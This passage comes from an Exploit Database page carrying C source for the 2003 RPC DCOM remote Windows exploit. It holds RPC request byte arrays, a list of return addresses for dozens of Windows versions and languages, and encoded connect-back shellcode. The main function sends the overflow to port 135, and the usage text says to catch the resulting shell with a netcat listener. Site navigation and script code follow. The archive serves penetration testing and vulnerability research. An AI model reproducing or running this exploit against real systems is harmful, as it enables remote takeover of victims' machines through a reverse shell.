01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x5C,0x00,0x43,0x00,0x24,0x00,0x5C,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};/* Myam add OFFSETS*/char winntsp4eng[] = "\xe5\x27\xf3\x77"; /* English winNT sp4 */char winntsp5cn[] = "\xcf\xda\xee\x77"; /* china winNT sp5 */char winntsp6cn[] = "\xac\x0e\xf0\x77"; /* china winNT sp6 */char winntsp6acn[] = "\xc3\xea\xf0\x77"; /* china NT sp6a */char win2knosppl[] = "\x4d\x3f\xe3\x77"; /* polish win2k nosp ver 5.00.2195*/char win2ksp3pl[] = "\x29\x2c\xe4\x77"; /* polish win2k sp3 - ver 5.00.2195 tested */char win2ksp4sp[] = "\x13\x3b\xa5\x77"; /* spanish win2k sp4 */char win2knospeng1[] = "\x74\x16\xe8\x77"; /* english win2k nosp 1 */char win2knospeng2[] = "\x6d\x3f\xe3\x77"; /* english win2k nosp 2 */char win2ksp1eng[] = "\xec\x29\xe8\x77"; /* english win2k sp1 */char win2ksp2eng1[] = "\x2b\x49\xe2\x77"; /* english win2k sp2 1 */char win2ksp2eng2[] = "\xb5\x24\xe8\x77"; /* english win2k sp2 2 */char win2ksp3eng1[] = "\x7a\x36\xe8\x77"; /* english win2k sp3 1 */char win2ksp3eng2[] = "\x5c\xfa\x2e\x77"; /* english win2k sp3 2 */char win2ksp4eng[] = "\x9b\x2a\xf9\x77"; /* english win2k sp4 */char win2knospchi[] = "\x2a\xe3\xe2\x77"; /* china win2k nosp */char win2ksp1chi[] = "\x8b\x89\xe6\x77"; /* china win2k sp1 */char win2ksp2chi[] = "\x2b\x49\xe0\x77"; /* china win2k sp2 */char win2ksp3chi[] = "\x44\x43\x42\x41"; /* china win2k sp3 */char win2ksp4chi[] = "\x29\x4c\xdf\x77"; /* china win2k sp4 */char win2ksp3ger[] = "\x7a\x88\x2e\x77"; /* german win2k sp3 */char win2knospjap[] = "\xe5\x27\xf3\x77"; /* Japanese win2k nosp */char win2ksp1jap[] = "\x8b\x89\xe5\x77"; /* Japanese win2k sp1 */char win2ksp2jap[] = "\x2b\x49\xdf\x77"; /* japanese win2k sp2 */char win2knospkr[] = "\x2a\xe3\xe1\x77"; /* Korea win2k nosp */char win2ksp1kr[] = "\x8b\x89\xe5\x77"; /* Korea win2k sp1 same offset as win2kjp_sp1 ??*/char win2ksp2kr[] = "\x2b\x49\xdf\x77"; /* Korea win2k sp2 */char win2knospmx[] = "\x2a\xe3\xe1\x77"; /* Mexican win2k nosp */char win2ksp1mx[] = "\x8b\x89\xe8\x77"; /* Mexican win2k sp1 */char win2knospken[] = "\x4d\x3f\xe3\x77"; /* Kenya win2k sp1 */char win2ksp1ken[] = "\x8b\x89\xe8\x77"; /* Kenya win2k sp1 */char win2ksp2ken[] = "\x2b\x49\xe2\x77"; /* Kenya win2k sp1 */char winxpnospeng[] = "\xe3\xaf\xe9\x77"; /* english xp nosp ver 5.1.2600 */char winxpsp1eng1[] = "\xba\x26\xe6\x77"; /* english xp sp1 1 */char winxpsp1eng2[] = "\xdb\x37\xd7\x77"; /* english xp sp1 2 */char winxpsp2eng[] = "\xbd\x73\x7d\x77"; /* english xp sp2 */char win2k3nospeng[] = "\xb0\x54\x22\x77"; /* english win2k3 */char Win2ksp3ger[] = "\x29\x2c\xe3\x77"; /* Germanh win2 sp3 */char Win2ksp4ger1[] = "\x29\x4c\xe0\x77"; /* German win2 sp4 1 */char Win2ksp4ger2[] = "\x56\xc2\xe2\x77"; /* German win2 sp4 2 */char winxpsp1ger[] = "\xfc\x18\xd4\x77"; /* German xp sp1 */char Win2ksp1fr[] = "\x4b\x3e\xe4\x77"; /* French win2k Server SP1 */char Win2ksp4fr[] = "\x56\xc2\xe2\x77"; /* French win2k Server SP4 */char winxpsp0fr[] = "\x4a\x75\xd4\x77"; /* French win xp no sp */char winxpsp1fr[] = "\xfc\x18\xd4\x77"; /* French win xp sp 1 */char win2ksp3big[] = "\x25\x2b\xaa\x77";char win2ksp4big[] = "\x29\x4c\xdf\x77";char winxpsp01big[] = "\xfb\x7b\xa1\x71";/* Test this offset( Japanese Windows 2000 Pro SP2 ) : 0x77DF492BWindows 2000 (no-service-pack) English 0x77e33f6d0x77f92a9b0x77e2afc50x772254b0 win2k30x77E829E3 / 0x77E83587 kokanin win2k sp3*/unsigned char sc[]="\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x4E\x00\x42\x00\x46\x00\x58\x00\x46\x00\x58\x00""\x46\x00\x58\x00\x46\x00\x58\x00""\x29\x4c\xdf\x77" //sp4//"\x29\x2c\xe2\x77"//0x77e22c29"\x38\x6e\x16\x76\x0d\x6e\x16\x76" //??????????"\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""\xfc\xff\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""\x93\x40\xe2\xfa"// code"\x7b\xe4\x93\x93\x93\xd4\xf6\xe7\xc3\xe1\xfc\xf0\xd2\xf7\xf7\xe1""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xdf\xfa\xf1\xe1\xf2\xe1\xea\xd2""\x93\xd0\xe1\xf6\xf2\xe7\xf6\xc3\xe1\xfc\xf0\xf6\xe0\xe0\xd2\x93""\xd0\xff\xfc\xe0\xf6\xdb\xf2\xfd\xf7\xff\xf6\x93\xd6\xeb\xfa\xe7""\xc7\xfb\xe1\xf6\xf2\xf7\x93\xe4\xe0\xa1\xcc\xa0\xa1\x93\xc4\xc0""\xd2\xc0\xe7\xf2\xe1\xe7\xe6\xe3\x93\xc4\xc0\xd2\xc0\xfc\xf0\xf8""\xf6\xe7\xd2\x93\xf0\xff\xfc\xe0\xf6\xe0\xfc\xf0\xf8\xf6\xe7\x93""\xf0\xfc\xfd\xfd\xf6\xf0\xe7\x93\xf0\xfe\xf7\x93\xc9\xc1\x28\x93""\x93\x63\xe4\x12\xa8\xde\xc9\x03\x93\xe7\x90\xd8\x78\x66\x18\xe0""\xaf\x90\x60\x18\xe5\xeb\x90\x60\x18\xed\xb3\x90\x68\x18\xdd\x87""\xc5\xa0\x53\xc4\xc2\x18\xac\x90\x68\x18\x61\xa0\x5a\x22\x9d\x60""\x35\xca\xcc\xe7\x9b\x10\x54\x97\xd3\x71\x7b\x6c\x72\xcd\x18\xc5""\xb7\x90\x40\x42\x73\x90\x51\xa0\x5a\xf5\x18\x9b\x18\xd5\x8f\x90""\x50\x52\x72\x91\x90\x52\x18\x83\x90\x40\xcd\x18\x6d\xa0\x5a\x22""\x97\x7b\x08\x93\x93\x93\x10\x55\x98\xc1\xc5\x6c\xc4\x63\xc9\x18""\x4b\xa0\x5a\x22\x97\x7b\x14\x93\x93\x93\x10\x55\x9b\xc6\xfb\x92""\x92\x93\x93\x6c\xc4\x63\x16\x53\xe6\xe0\xc3\xc3\xc3\xc3\xd3\xc3""\xd3\xc3\x6c\xc4\x67\x10\x6b\x6c\xe7\xf0\x18\x4b\xf5\x54\xd6\x93""\x91\x93\xf5\x54\xd6\x91\x28\x39\x54\xd6\x97\x4e\x5f\x28\x39\xf9""\x83\xc6\xc0\x6c\xc4\x6f\x16\x53\xe6\xd0\xa0\x5a\x22\x82\xc4\x18""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""\x7f\x19\x95\xd5\x17\x53\xe6\x6a\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};int main(int argc,char ** argv){int len, len1, sockfd;short port=135;struct hostent *he;struct sockaddr_in their_addr;unsigned char buf1[0x1000];unsigned char buf2[0x1000];unsigned short port1;DWORD cb;WSAStartup(MAKEWORD(2,0),&wsa);printf("OC192 RPC DCOM Remote Exploit BSD/Linux Port, thanks LSD and XFORCE\n");printf("RPC DCOM Remote Exploit modified by www.k-otiK.com ;>\n");if(argc<5){printf("[<$>] RPC Remote Windows Exploit\n");printf("[<$>] Modified by www.k-otiK.com - New Exploits Database\n");printf("[<$>] Thanks to b@digitalwaste.org + Jørgen_Haaø + woutiir \n");printf("[<$>] Usage: %s <victim> <connectback ip> <cb port> <target>\n",argv[0]);printf("[<$>] On connect back nc -lp cbport\n");printf("[<$>] Targets: 0 WinNT English +sp4\n");printf("[<$>] 1 WinNT China +sp5\n");printf("[<$>] 2 WinNT China +sp6\n");printf("[<$>] 3 WinNT China +sp6a\n");printf("[<$>] 4 Win2k Polish nosp ver 5.00.2195\n");printf("[<$>] 5 Win2k Polish +sp3 ver 5.00.2195\n");printf("[<$>] 6 Win2k Spanish +sp4\n");printf("[<$>] 7 Win2k English nosp 1\n");printf("[<$>] 8 Win2k English nosp 2\n");printf("[<$>] 9 Win2k English +sp1\n");printf("[<$>] 10 Win2k English +sp2 1\n");printf("[<$>] 11 Win2k English +sp2 2\n");printf("[<$>] 12 Win2k English +sp3 1\n");printf("[<$>] 13 Win2k English +sp3 2\n");printf("[<$>] 14 Win2k English +sp4\n");printf("[<$>] 15 Win2k China nosp\n");printf("[<$>] 16 Win2k China +sp1\n");printf("[<$>] 17 Win2k China +sp2\n");printf("[<$>] 18 Win2k China +sp3\n");printf("[<$>] 19 Win2k China +sp4\n");printf("[<$>] 20 Win2k German +sp3\n");printf("[<$>] 21 Win2k Japanese nosp\n");printf("[<$>] 22 Win2k Japanese +sp1\n");printf("[<$>] 23 Win2k Japanese +sp2\n");printf("[<$>] 24 Win2k Korea nosp\n");printf("[<$>] 25 Win2k Korea +sp1\n");printf("[<$>] 26 Win2k Korea +sp2\n");printf("[<$>] 27 Win2k Mexican nosp\n");printf("[<$>] 28 Win2k Mexican +sp1\n");printf("[<$>] 29 Win2k Kenya nosp\n");printf("[<$>] 30 Win2k Kenya +sp1\n");printf("[<$>] 31 Win2k Kenya +sp2\n");printf("[<$>] 32 WinXP English nosp ver 5.1.2600\n");printf("[<$>] 33 WinXP English +sp1 1\n");printf("[<$>] 34 WinXP English +sp1 2\n");printf("[<$>] 35 WinXP English +sp2\n");printf("[<$>] 36 Win2k3 English nosp\n");printf("[<$>] 37 Win2k german sp3\n");printf("[<$>] 38 Win2k german sp4\n");printf("[<$>] 39 Win2k german sp4 2\n");printf("[<$>] 40 Winxp german sp1 2\n");printf("[<$>] 41 Win2k french sp1\n");printf("[<$>] 42 Win2k french sp4\n");printf("[<$>] 43 Winxp french sp0\n");printf("[<$>] 44 Winxp french sp1\n");printf("[<$>] 45 Win2k big5 sp3\n");printf("[<$>] 46 Win2k big5 sp4\n");printf("[<$>] 47 Winxp big5 sp0\n");exit(1);}if ((he=gethostbyname(argv[1])) == NULL) { // get the host infoperror("gethostbyname");exit(1);}if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {perror("socket");exit(1);}their_addr.sin_family = AF_INET;their_addr.sin_port = htons(port);their_addr.sin_addr = *((struct in_addr *)he->h_addr);memset(&(their_addr.sin_zero), '\0', 8);if (connect(sockfd, (struct sockaddr *)&their_addr, sizeof(structsockaddr)) == -1) {printf("Sorry, cannot connect to %s. Try again...\n", argv[1]);exit(1);}if(atoi(argv[4])==0)memcpy(sc+36,winntsp4eng,sizeof(winntsp4eng));else if (atoi(argv[4])==1)memcpy(sc+36,winntsp5cn,sizeof(winntsp5cn));else if (atoi(argv[4])==2)memcpy(sc+36,winntsp6cn,sizeof(winntsp6cn));else if (atoi(argv[4])==3)memcpy(sc+36,winntsp6acn,sizeof(winntsp6acn));else if (atoi(argv[4])==4)memcpy(sc+36,win2knosppl,sizeof(win2knosppl));else if (atoi(argv[4])==5)memcpy(sc+36,win2ksp3pl,sizeof(win2ksp3pl));else if (atoi(argv[4])==6)memcpy(sc+36,win2ksp4sp,sizeof(win2ksp4sp));else if (atoi(argv[4])==7)memcpy(sc+36,win2knospeng1,sizeof(win2knospeng1));else if (atoi(argv[4])==8)memcpy(sc+36,win2knospeng2,sizeof(win2knospeng2));else if (atoi(argv[4])==9)memcpy(sc+36,win2ksp1eng,sizeof(win2ksp1eng));else if (atoi(argv[4])==10)memcpy(sc+36,win2ksp2eng1,sizeof(win2ksp2eng1));else if (atoi(argv[4])==11)memcpy(sc+36,win2ksp2eng2,sizeof(win2ksp2eng2));else if (atoi(argv[4])==12)memcpy(sc+36,win2ksp3eng1,sizeof(win2ksp3eng1));else if (atoi(argv[4])==13)memcpy(sc+36,win2ksp3eng2,sizeof(win2ksp3eng2));else if (atoi(argv[4])==14)memcpy(sc+36,win2ksp4eng,sizeof(win2ksp4eng));else if (atoi(argv[4])==15)memcpy(sc+36,win2knospchi,sizeof(win2knospchi));else if (atoi(argv[4])==16)memcpy(sc+36,win2ksp1chi,sizeof(win2ksp1chi));else if (atoi(argv[4])==17)memcpy(sc+36,win2ksp2chi,sizeof(win2ksp2chi));else if (atoi(argv[4])==18)memcpy(sc+36,win2ksp3chi,sizeof(win2ksp3chi));else if (atoi(argv[4])==19)memcpy(sc+36,win2ksp4chi,sizeof(win2ksp4chi));else if (atoi(argv[4])==20)memcpy(sc+36,win2ksp3ger,sizeof(win2ksp3ger));else if (atoi(argv[4])==21)memcpy(sc+36,win2knospjap,sizeof(win2knospjap));else if (atoi(argv[4])==22)memcpy(sc+36,win2ksp1jap,sizeof(win2ksp1jap));else if (atoi(argv[4])==23)memcpy(sc+36,win2ksp2jap,sizeof(win2ksp2jap));else if (atoi(argv[4])==24)memcpy(sc+36,win2knospkr,sizeof(win2knospkr));else if (atoi(argv[4])==25)memcpy(sc+36,win2ksp1kr,sizeof(win2ksp1kr));else if (atoi(argv[4])==26)memcpy(sc+36,win2ksp2kr,sizeof(win2ksp2kr));else if (atoi(argv[4])==27)memcpy(sc+36,win2knospmx,sizeof(win2knospmx));else if (atoi(argv[4])==28)memcpy(sc+36,win2ksp1mx,sizeof(win2ksp1mx));else if (atoi(argv[4])==29)memcpy(sc+36,win2knospken,sizeof(win2knospken));else if (atoi(argv[4])==30)memcpy(sc+36,win2ksp1ken,sizeof(win2ksp1ken));else if (atoi(argv[4])==31)memcpy(sc+36,win2ksp2ken,sizeof(win2ksp2ken));else if (atoi(argv[4])==32)memcpy(sc+36,winxpnospeng,sizeof(winxpnospeng));else if (atoi(argv[4])==33)memcpy(sc+36,winxpsp1eng1,sizeof(winxpsp1eng1));else if (atoi(argv[4])==34)memcpy(sc+36,winxpsp1eng2,sizeof(winxpsp1eng2));else if (atoi(argv[4])==35)memcpy(sc+36,winxpsp2eng,sizeof(winxpsp2eng));else if (atoi(argv[4])==36)memcpy(sc+36,win2k3nospeng,sizeof(win2k3nospeng));else if (atoi(argv[4])==37)memcpy(sc+36,win2k3nospeng,sizeof(Win2ksp3ger));else if (atoi(argv[4])==38)memcpy(sc+36,win2k3nospeng,sizeof(Win2ksp4ger1));else if (atoi(argv[4])==39)memcpy(sc+36,win2k3nospeng,sizeof(Win2ksp4ger2));else if (atoi(argv[4])==40)memcpy(sc+36,win2k3nospeng,sizeof(winxpsp1ger));else if (atoi(argv[4])==41)memcpy(sc+36,win2k3nospeng,sizeof(Win2ksp1fr));else if (atoi(argv[4])==42)memcpy(sc+36,win2k3nospeng,sizeof(Win2ksp4fr));else if (atoi(argv[4])==43)memcpy(sc+36,win2k3nospeng,sizeof(winxpsp0fr));else if (atoi(argv[4])==44)memcpy(sc+36,win2k3nospeng,sizeof(winxpsp1fr));else if (atoi(argv[4])==45)memcpy(sc+36,win2k3nospeng,sizeof(win2ksp3big));else if (atoi(argv[4])==46)memcpy(sc+36,win2k3nospeng,sizeof(win2ksp4big));else if (atoi(argv[4])==47)memcpy(sc+36,win2k3nospeng,sizeof(winxpsp01big));port1 = htons(atoi(argv[3]));port1 ^= 0x9393;cb=inet_addr(argv[2]);cb ^= 0x93939393;*(unsigned short *)&sc[330+0x30] = port1;*(unsigned int *)&sc[335+0x30] = cb;len=sizeof(sc);memcpy(buf2,request1,sizeof(request1));len1=sizeof(request1);*(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;*(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sc,sizeof(sc));len1=len1+sizeof(sc);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;*(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;*(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;if(send(sockfd, bindstr, sizeof(bindstr), 0)== -1){printf("Send failed pussy.\n");exit(1);}len=recv(sockfd,buf1,1000,0);if (send(sockfd,buf2,len1,0)==SOCKET_ERROR) {printf("Send failed pussy\n");exit (1);}len=recv(sockfd,buf1,1024,0);return 0;}// milw0rm.com [2003-07-30]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert 